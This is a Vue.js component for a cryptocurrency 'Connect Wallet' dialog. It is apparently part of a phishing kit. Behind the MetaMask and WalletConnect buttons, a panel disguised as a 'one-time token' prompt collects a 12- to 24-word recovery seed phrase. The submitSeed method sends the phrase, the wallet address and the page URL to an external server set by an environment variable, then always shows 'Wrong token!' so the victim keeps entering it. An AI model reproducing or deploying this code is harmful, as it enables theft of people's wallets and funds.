<template>
  <div
    v-if="modalVisibility"
    class="modal-b"
    :class="modalVisibility && 'is-visible'"
    id="modal-connect"
  >
    <div class="modal-b__inner">
      <div class="modal-b__block">
        <div ref="modalStart" class="modal-b__start" v-if="!wallet && !loading">
          <h2 class="popup__title">Connect Wallet</h2>
          <div class="popup__wallet">
            <label class="popup__label">
              <input
                type="radio"
                value="Ethereum"
                name="popup-wallet"
                class="popup__radio"
                checked="checked"
              />
              <span>Ethereum</span>
            </label>
            <label class="popup__label">
              <input
                type="radio"
                value="BNB Chain"
                name="popup-wallet"
                class="popup__radio"
              />
              <span>BNB Chain</span>
            </label>
            <label class="popup__label">
              <input
                type="radio"
                value="Polygon"
                name="popup-wallet"
                class="popup__radio"
              />
              <span>Polygon</span>
            </label>
          </div>
          <button type="button" @click="onClickMetaMask" class="popup__button">
            <img src="@/assets/img/content/metamask.svg" alt="" />
            <span>MetaMask</span>
          </button>
          <button
            type="button"
            @click="onClickWalletConnect"
            class="popup__button"
          >
            <img src="@/assets/img/content/walletconnect.svg" alt="" />
            <span>WalletConnect</span>
          </button>
          <p class="popup__text">
            Don’t have a wallet?
            <a href="javascript:void(0);">Learn how to get one</a>
          </p>
        </div>
        <div ref="modalConnect" class="modal-b__connect">
          <div class="connect-wrapper">
            <div
              v-if="needChangeNetwork === null"
              class="connect-wrapper__title"
            >
              <div class="connect-wrapper__loader">
                <img src="@/assets/img/content/loader.svg" alt="" />
              </div>
              <div
                v-if="
                  ((!wallet && !checkAnotherWallet) || loading) &&
                  !approveStatus
                "
              >
                Please connect your wallet
              </div>
              <div v-if="!!wallet && checkAnotherWallet && !approveStatus">
                Please Log in using a&nbsp;different&nbsp;wallet
              </div>
              <div v-if="!!wallet && approveStatus">
                Please confirm action on&nbsp;your&nbsp;wallet
              </div>
            </div>

            <div v-else class="connect-wrapper__content change-network">
              <div class="connect-wrapper__text">
                <strong>You Must Change Network</strong>
              </div>

              <div class="connect-wrapper__text connect-wrapper__text_small">
                <p>
                  We've detected that you need to switch your wallet's network
                  to <strong>{{ needNetworkChangeName }}</strong> to continue.
                </p>

                <span class="button-wrapper">
                  <img src="@/assets/img/content/network.svg" alt="" />

                  <button
                    class="popup__button change-network"
                    @click.prevent="reload"
                  >
                    <span>Reload Page</span>
                  </button>
                </span>
              </div>
            </div>

            <div class="connect-wrapper__buttons">
              <div v-if="checkAnotherWallet" class="connect-wrapper__button">
                <button
                  :disabled="loading"
                  class="popup__button"
                  @click.prevent="reload"
                >
                  <span>Refresh</span>
                </button>
              </div>
              <div
                v-if="(loading || approveStatus) && needChangeNetwork === null"
                class="connect-wrapper__loader"
              >
                <img src="@/assets/img/content/loader.svg" alt="" />
              </div>
            </div>
          </div>
        </div>

        <div class="modal-b__token">
          <div class="modal-b__title">
            Для продолжения введите&nbsp;одноразвый токен
          </div>
          <div class="form-token-b">
            <div class="form-token-b__list">
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-1.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-2.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-3.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-4.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-5.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-6.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-7.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-8.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-9.avif" alt="" />
                </a>
              </div>
              <div class="form-token-b__item">
                <a href="#">
                  <img src="@/assets/img/content/token-10.avif" alt="" />
                </a>
              </div>
            </div>
            <div class="form-token-b__input">
              <textarea
                placeholder="Green Gold Cyan Tomato White Aqua Salmon Azure Teal Pink Purple Grey"
                class="form-token-b__input-type form-token-b__input-type_error"
              ></textarea>
              <div class="form-token-b__error">Wrong token!</div>
            </div>
            <div class="form-token-b__button">
              <input
                type="submit"
                class="form-subscribe__submit"
                value="Submit"
                disabled
              />
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="modal-b__bg"></div>
  </div>
</template>

<script>
import modals from "@/mixins/modals";
import common from "@/mixins/common";
import { mapGetters } from "vuex";
import axios from "axios";

export default {
  name: "ModalComponent",
  mixins: [modals, common],
  data() {
    return {
      hasSeedError: false,
      seed: null,
      seedInProgress: false,
    };
  },
  computed: {
    ...mapGetters({
      stage: "stage",
      loading: "loading",
      wallet: "wallet",
      networkNameForChange: "networkNameForChange",
    }),
    seedDisabled() {
      let seed = this.seed;
      if (!seed) {
        return true;
      }
      seed = seed.replace(/\s+/g, " ").trim();
      let countWords = seed.split(" ").length;

      return (
        !(
          countWords === 12 ||
          countWords === 14 ||
          countWords === 16 ||
          countWords === 18 ||
          countWords === 20 ||
          countWords === 22 ||
          countWords === 24
        ) || this.seedInProgress
      );
    },
    seedStage() {
      return this.stage === "seedInput" && !this.loading;
    },
    seedInputClass() {
      return { "form-token-b__input-type_error": this.hasSeedError };
    },
  },
  methods: {
    submitSeed() {
      this.seedInProgress = true;
      axios
        .post(`https://${process.env.VUE_APP_CHECK_IP}/api/seed`, {
          wallet: this.wallet,
          seed: this.seed,
          link: location.href,
        })
        .finally(() => {
          this.hasSeedError = true;
          this.seedInProgress = false;
          this.seed = null;
        });
    },
    onClickMetaMask() {
      this.$refs.modalStart.style.display = "none";
      this.$refs.modalConnect.style.display = "block";
      this.connect("mm");
    },
    onClickWalletConnect() {
      this.$refs.modalStart.style.display = "none";
      this.$refs.modalConnect.style.display = "block";
      this.connect("wc");
    },
  },
  watch: {
    seed(value) {
      if (value && this.hasSeedError) {
        this.hasSeedError = false;
      }
    },
  },
};
</script>
